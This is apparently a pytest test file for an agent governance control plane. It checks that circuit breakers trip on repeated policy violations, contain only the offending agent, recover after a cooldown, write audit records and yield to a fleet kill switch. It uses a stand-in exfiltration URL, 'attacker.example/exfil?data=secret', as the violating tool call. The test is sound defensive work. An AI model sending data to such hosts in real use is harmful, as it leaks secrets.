"""Circuit breakers e2e over the REAL governed stack (RUN-06, Slice 9d, Task 5).

The RUN-06 acceptance proof over ONE shared store and the SAME `CircuitBreakerStore` instance (so the
in-memory state the pipeline's stage-1f check reads is the one the signals update):

  - baseline: a benign allowlisted `http_get` is ALLOWED (so a later deny is attributable to the breaker)
  - two real policy-floor violations (exfil to a non-allowlisted host) -> the breaker TRIPS
  - the SAME agent's previously-benign action is now denied with `circuit_open` — containment reaching
    BEYOND the action that violated, which is the whole point of a breaker
  - a DIFFERENT agent is entirely unaffected (no cross-agent blast radius)
  - past the cooldown the benign action is permitted again (HALF_OPEN), and its success CLOSES the
    breaker (`circuit_reset`)
  - both transitions are on the audit chain and `verify_chain` reports ok
  - kill-switch precedence: with BOTH a fleet kill and an open breaker, the reason code is the kill
    switch's (`fleet_killed`) — operator intent is evaluated before the automatic trip, and the two
    carry DISTINCT reason codes so forensics can tell them apart

The pipeline runs the REAL compiled-constitution engine, so the violations that feed the breaker are
real policy denies, not stubs.
"""

from __future__ import annotations

import asyncio

import pytest
from sqlalchemy import create_engine, select
from sqlalchemy.pool import StaticPool

from agentos_contract import ActionType, AgentAction, Outcome
from agentos_controlplane.audit import AuditWriter
from agentos_controlplane.audit_verify import verify_chain
from agentos_controlplane.circuit_breaker import CircuitBreakerStore
from agentos_controlplane.killswitch import KillSwitchStore
from agentos_controlplane.registry import Registry
from agentos_controlplane.store.engine import create_all, create_session_factory
from agentos_controlplane.store.models import AuditRecord, CircuitBreakerState
from agentos_pipeline.identity import IdentityStage
from agentos_pipeline.policy import ConstitutionPolicyEngine
from agentos_pipeline.posture import PostureMap
from agentos_pipeline.risk import PromptInjectionScorer
from agentos_pipeline.runner import Pipeline

AGENT_ID = "breaking-agent"
OTHER_AGENT = "healthy-agent"
_BENIGN_URL = "https://api.example.com/data"
_EXFIL_URL = "https://attacker.example/exfil?data=secret"


class _Wired:
    """Pipeline + CircuitBreakerStore over ONE shared store and the SAME breaker instance."""

    def __init__(self, constitution_wasm) -> None:
        engine = create_engine(
            "sqlite+pysqlite:///:memory:",
            poolclass=StaticPool,
            connect_args={"check_same_thread": False},
        )
        create_all(engine)
        self.store = create_session_factory(engine)
        registry = Registry(self.store)
        self.token = registry.register(AGENT_ID)
        self.other_token = registry.register(OTHER_AGENT)
        self.audit = AuditWriter(self.store)  # ONE writer per store (the chain-head cache)
        self.clock = [1000.0]
        self.breaker = CircuitBreakerStore(
            self.store,
            self.audit,
            failure_threshold=2,
            window_s=60.0,
            cooldown_s=30.0,
            now=lambda: self.clock[0],
        )
        self.kill = KillSwitchStore(self.store, self.audit)
        self.pipeline = Pipeline(
            identity=IdentityStage(registry.identity),
            policy=ConstitutionPolicyEngine(
                wasm_path=str(constitution_wasm.wasm_path),
                lists=constitution_wasm.bundle.lists,
                constitution_version=constitution_wasm.bundle.constitution_version,
                principles_meta=constitution_wasm.principles_meta,
            ),
            scorers=[PromptInjectionScorer()],
            audit=self.audit,
            posture=PostureMap(),
            kill_switch=self.kill,   # stage 0 — precedence over the breaker is asserted below
            breaker=self.breaker,    # SAME instance the signals update
        )

    def action(self, agent_id: str, token: str, url: str = _BENIGN_URL) -> AgentAction:
        return AgentAction(
            agent_id=agent_id,
            type=ActionType.tool_call,
            target="http_get",
            payload={"url": url, "content": ""},
            identity_token=token,
        )

    def evaluate(self, agent_id: str, token: str, url: str = _BENIGN_URL):
        return asyncio.run(self.pipeline.evaluate(self.action(agent_id, token, url)))

    def violate(self, times: int = 2) -> None:
        """Real policy-floor denies (egress to a non-allowlisted host) — the breaker's fuel."""
        for _ in range(times):
            decision = self.evaluate(AGENT_ID, self.token, _EXFIL_URL)
            assert decision.outcome is not Outcome.allow, "the exfil must be a real violation"


@pytest.fixture
def wired(constitution_wasm) -> _Wired:
    return _Wired(constitution_wasm)


def _events(store, kind: str) -> list[dict]:
    with store() as s:
        rows = s.scalars(select(AuditRecord).order_by(AuditRecord.seq))
        return [r.body for r in rows if r.body.get("kind") == kind]


def test_baseline_benign_action_is_allowed(wired: _Wired) -> None:
    """Sanity: the benign action is allowed, so any later deny is attributable to the breaker."""
    assert wired.evaluate(AGENT_ID, wired.token).outcome is Outcome.allow


def test_repeated_violations_trip_the_breaker_and_contain_the_agent(wired: _Wired) -> None:
    """THE RUN-06 acceptance proof: the containment reaches BEYOND the violating action. The benign
    `http_get` was allowed a moment ago; after two real policy denies the SAME call is refused."""
    assert wired.evaluate(AGENT_ID, wired.token).outcome is Outcome.allow
    wired.violate()

    contained = wired.evaluate(AGENT_ID, wired.token)
    assert contained.outcome is Outcome.deny
    assert contained.reasons[-1].stage == "circuit_breaker"
    assert contained.reasons[-1].code == "circuit_open"
    assert contained.evidence_ref is not None  # audited as a DECISION record
    tripped = _events(wired.store, "circuit_tripped")
    assert {b["key"] for b in tripped} == {AGENT_ID, f"{AGENT_ID}|http_get"}
    with wired.store() as s:
        assert s.get(CircuitBreakerState, AGENT_ID).state == "open"


def test_a_trip_does_not_contain_a_different_agent(wired: _Wired) -> None:
    """No cross-agent blast radius: one agent's breaker must never deny another agent."""
    wired.violate()
    assert wired.evaluate(AGENT_ID, wired.token).outcome is Outcome.deny
    assert wired.evaluate(OTHER_AGENT, wired.other_token).outcome is Outcome.allow


def test_the_breakers_own_denials_never_feed_it(wired: _Wired) -> None:
    """The feedback-loop guard over the real stack: an OPEN breaker's own `circuit_open` denials must
    not be counted as violations. If they were, the window would keep refilling, every trial would
    re-open the breaker, and the agent could never recover — so ONLY the two original trips exist."""
    wired.violate()
    before = len(wired.breaker._fails[AGENT_ID])
    for _ in range(5):
        assert wired.evaluate(AGENT_ID, wired.token).outcome is Outcome.deny

    # The rolling WINDOW is the observable surface here: the trip count alone cannot see this bug,
    # because an already-OPEN breaker declines to re-trip. Feeding the window from the breaker's own
    # denials is what makes the recovery below impossible, so assert the window never moved.
    assert len(wired.breaker._fails[AGENT_ID]) == before
    assert len(_events(wired.store, "circuit_tripped")) == 2  # the original pair, nothing more
    with wired.store() as s:
        assert s.get(CircuitBreakerState, AGENT_ID).trip_count == 1

    # And the proof that it can still RECOVER: past the cooldown the trial is admitted and closes it.
    wired.clock[0] += 30.0
    assert wired.evaluate(AGENT_ID, wired.token).outcome is Outcome.allow
    assert wired.breaker.list_open() == []


def test_the_cooldown_admits_a_trial_and_success_closes_the_breaker(wired: _Wired) -> None:
    wired.violate()
    assert wired.evaluate(AGENT_ID, wired.token).outcome is Outcome.deny

    wired.clock[0] += 30.0  # cooldown elapsed -> HALF_OPEN admits trial traffic
    recovered = wired.evaluate(AGENT_ID, wired.token)
    assert recovered.outcome is Outcome.allow
    assert not any(r.stage == "circuit_breaker" for r in recovered.reasons)

    reset = {b["key"]: b["reason"] for b in _events(wired.store, "circuit_reset")}
    assert reset == {AGENT_ID: "trial_succeeded", f"{AGENT_ID}|http_get": "trial_succeeded"}
    with wired.store() as s:
        assert s.get(CircuitBreakerState, AGENT_ID).state == "closed"


def test_a_failed_trial_reopens_the_breaker(wired: _Wired) -> None:
    """A trial that violates again re-opens immediately — recovery is earned, not granted."""
    wired.violate()
    wired.clock[0] += 30.0
    wired.evaluate(AGENT_ID, wired.token, _EXFIL_URL)  # the trial itself violates
    assert wired.evaluate(AGENT_ID, wired.token).outcome is Outcome.deny
    with wired.store() as s:
        assert s.get(CircuitBreakerState, AGENT_ID).trip_count == 2


def test_containment_survives_a_restart(wired: _Wired) -> None:
    """A restarted control plane reloads the OPEN state — a restart must not un-trip a breaker."""
    wired.violate()
    fresh = CircuitBreakerStore(
        wired.store, wired.audit, failure_threshold=2, cooldown_s=30.0, now=lambda: wired.clock[0]
    )
    assert fresh.status(AGENT_ID, "http_get") is not None
    assert fresh.status(OTHER_AGENT, "http_get") is None


def test_transitions_are_audited_and_the_chain_verifies(wired: _Wired) -> None:
    wired.violate()
    wired.clock[0] += 30.0
    wired.evaluate(AGENT_ID, wired.token)  # closes it

    assert len(_events(wired.store, "circuit_tripped")) == 2
    assert len(_events(wired.store, "circuit_reset")) == 2
    # Decisions and breaker transitions interleave on the ONE chain and it still verifies.
    assert verify_chain(wired.store).ok


def test_the_kill_switch_takes_PRECEDENCE_over_the_breaker(wired: _Wired) -> None:
    """Precedence with DISTINCT reason codes: stage 0 (operator intent) is evaluated before stage 1f
    (an automatic trip). With BOTH active the record must say `fleet_killed`, so an operator reading
    the evidence can tell a deliberate halt from a self-inflicted trip."""
    wired.violate()
    assert wired.evaluate(AGENT_ID, wired.token).reasons[-1].code == "circuit_open"

    asyncio.run(wired.kill.kill_fleet(set_by="op@x", reason="incident-42"))
    killed = wired.evaluate(AGENT_ID, wired.token)
    assert killed.outcome is Outcome.deny
    assert [r.code for r in killed.reasons] == ["fleet_killed"]
    assert not any(r.code == "circuit_open" for r in killed.reasons)


def test_a_kill_switch_deny_records_no_breaker_signal(wired: _Wired) -> None:
    """Stage 0 short-circuits, so it feeds the breaker NOTHING: a fleet halt must not silently trip
    every agent's breaker as a side effect of the operator's own action."""
    asyncio.run(wired.kill.kill_fleet(set_by="op@x", reason="incident-42"))
    for _ in range(5):
        assert wired.evaluate(AGENT_ID, wired.token).outcome is Outcome.deny

    assert _events(wired.store, "circuit_tripped") == []
    assert wired.breaker.list_open() == []
